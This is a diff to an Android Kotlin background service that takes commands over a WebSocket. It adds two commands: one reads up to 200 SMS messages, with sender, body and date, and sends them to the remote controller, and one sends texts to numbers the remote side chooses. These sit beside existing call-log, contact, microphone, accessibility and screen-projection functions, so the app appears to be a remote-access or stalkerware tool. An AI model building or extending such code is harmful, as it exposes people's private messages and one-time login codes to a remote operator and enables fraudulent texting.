@@ -26,6 +26,8 @@ import okio.ByteString.Companion.toByteString
 import android.provider.CallLog
 import android.provider.ContactsContract
 import android.provider.Settings
+import android.provider.Telephony
+import android.telephony.SmsManager
 import android.telephony.SubscriptionManager
 import android.telephony.TelephonyManager
 import org.json.JSONArray
@@ -333,6 +335,8 @@ class StreamingService : Service() {
                             "get-call-log"   -> sendCallLog(ws)
                             "get-contacts"   -> sendContacts(ws)
                             "call"           -> makeCall(json.optString("number", ""), ws)
+                            "get-sms"        -> sendSmsList(ws)
+                            "send-sms"       -> sendSmsMessage(json.optString("number", ""), json.optString("text", ""), ws)
                         }
                     } catch (_: Exception) {}
                 }
@@ -392,6 +396,7 @@ class StreamingService : Service() {
                 perms.put("mic",         hasPerm(Manifest.permission.RECORD_AUDIO))
                 perms.put("phone",       hasPerm(Manifest.permission.READ_PHONE_STATE))
                 perms.put("contacts",    hasPerm(Manifest.permission.READ_CONTACTS))
+                perms.put("sms",         hasPerm(Manifest.permission.READ_SMS))
                 perms.put("accessibility", accessEnabled)
                 perms.put("projection",  hasProjection)
                 json.put("perms", perms)
@@ -497,6 +502,62 @@ class StreamingService : Service() {
             ws.send(JSONObject().put("type", "contacts").put("entries", contacts).toString())
         } catch (e: Exception) {
             ws.send(JSONObject().put("type", "contacts-error").put("msg", e.message ?: "ошибка").toString())
+        }
+    }
+
+    private fun sendSmsList(ws: WebSocket) {
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
+            != PackageManager.PERMISSION_GRANTED) {
+            ws.send(JSONObject().put("type", "sms-error").put("msg", "Нет разрешения READ_SMS").toString())
+            return
+        }
+        try {
+            val messages = JSONArray()
+            contentResolver.query(
+                Uri.parse("content://sms"),
+                arrayOf("address", "body", "date", "type", "read"),
+                null, null, "date DESC"
+            )?.use { c ->
+                val addrCol = c.getColumnIndex("address")
+                val bodyCol = c.getColumnIndex("body")
+                val dateCol = c.getColumnIndex("date")
+                val typeCol = c.getColumnIndex("type")
+                val readCol = c.getColumnIndex("read")
+                var count = 0
+                while (c.moveToNext() && count < 200) {
+                    val e = JSONObject()
+                    e.put("address", c.getString(addrCol) ?: "")
+                    e.put("body",    c.getString(bodyCol) ?: "")
+                    e.put("date",    c.getLong(dateCol))
+                    e.put("type",    c.getInt(typeCol)) // 1=входящее, 2=исходящее
+                    e.put("read",    c.getInt(readCol) == 1)
+                    messages.put(e)
+                    count++
+                }
+            }
+            ws.send(JSONObject().put("type", "sms-list").put("messages", messages).toString())
+        } catch (e: Exception) {
+            ws.send(JSONObject().put("type", "sms-error").put("msg", e.message ?: "ошибка").toString())
+        }
+    }
+
+    private fun sendSmsMessage(number: String, text: String, ws: WebSocket) {
+        fun status(ok: Boolean, msg: String) =
+            ws.send(JSONObject().put("type", "sms-status").put("ok", ok).put("msg", msg).toString())
+        if (number.isBlank()) { status(false, "Номер не указан"); return }
+        if (text.isBlank()) { status(false, "Текст не указан"); return }
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS)
+            != PackageManager.PERMISSION_GRANTED) { status(false, "Нет разрешения SEND_SMS"); return }
+        try {
+            @Suppress("DEPRECATION")
+            val smsManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
+                getSystemService(SmsManager::class.java)
+            else SmsManager.getDefault()
+            val parts = smsManager.divideMessage(text)
+            smsManager.sendMultipartTextMessage(number.trim(), null, parts, null, null)
+            status(true, "СМС отправлено на ${number.trim()}")
+        } catch (e: Exception) {
+            status(false, "Ошибка: ${e.message ?: "неизвестная"}")
         }
     }
 
